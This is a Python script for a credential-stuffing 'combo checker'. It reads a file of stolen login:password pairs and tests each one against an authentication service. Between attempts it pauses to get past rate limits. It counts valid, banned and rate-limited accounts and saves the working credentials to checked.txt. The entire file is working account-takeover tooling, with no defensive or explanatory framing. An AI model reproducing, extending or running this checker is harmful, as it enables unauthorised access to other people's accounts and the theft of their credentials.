import json
import tkinter as tk
from tkinter import filedialog
from time import sleep
from src.authentication import Account, Auth
import os
import time

def select_file():
    """Prompt the user to select a file and return its path."""
    root = tk.Tk()
    root.withdraw()
    print("Select a file with combos")
    return filedialog.askopenfilename(title="Select a file with combos")

def process_combos(filepath):
    """Process each combo from the given file."""
    with open(filepath, 'r') as f:
        combos = f.readlines()

    valid_combos = []

    # Initialize counters
    valid_count = 0
    banned_count = 0
    rate_limited_count = 0
    error_count = 0
    
    for combo in combos:
        combo = combo.strip()
        result = auth_instance.authenticate(logpass=combo)

        # If the account is valid, display the combo and add it to the valid_combos list
        if result.code is None and result.token:
            print(f"Valid Account!")
            valid_count += 1
            valid_combos.append(combo)
        elif result.code == 4:  # Assuming 4 is the code for banned accounts
            banned_count += 1
        elif result.code == 1:  # Assuming 1 is the code for rate limited accounts
            rate_limited_count += 1
        else:
            error_count += 1
            print(f"Error for Combo: {combo} - Error Code: {result.code}")

        display_ascii_art_during_sleep(30)
        
    # Display the counts
    print(f"\nSummary:")
    print(f"Valid Accounts: {valid_count}")
    print(f"Banned Accounts: {banned_count}")
    print(f"Rate Limited Accounts: {rate_limited_count}")
    print(f"Error Accounts: {error_count}")

    return valid_combos

def display_ascii_art_during_sleep(duration):
    frames = ['[        ','[        ]', '[L       ]', '[LI      ]', '[LIL     ]', '[LIL-    ]', '[LIL-J   ]', '[LIL-JA  ]', '[LIL-JAB ]', '[LIL-JABA]']
    end_time = time.time() + duration
    
    while time.time() < end_time:
        for frame in frames:
            print(frame, end='\r', flush=True)  # Overwrite the current line
            time.sleep(3)  # Adjust this value to change the speed of the animation

if __name__ == "__main__":
    auth_instance = Auth()
    filepath = select_file()
    
    if filepath:
        valid_combos = process_combos(filepath)
        
        # Write the valid combos to checked.txt
        with open('checked.txt', 'w') as f:
            for combo in valid_combos:
                if isinstance(combo, str):  # Ensure that combo is a string
                    f.write(combo + '\n')
                else:
                    print(f"Unexpected data type in valid_combos: {type(combo)}")
    else:
        print("No file selected!")
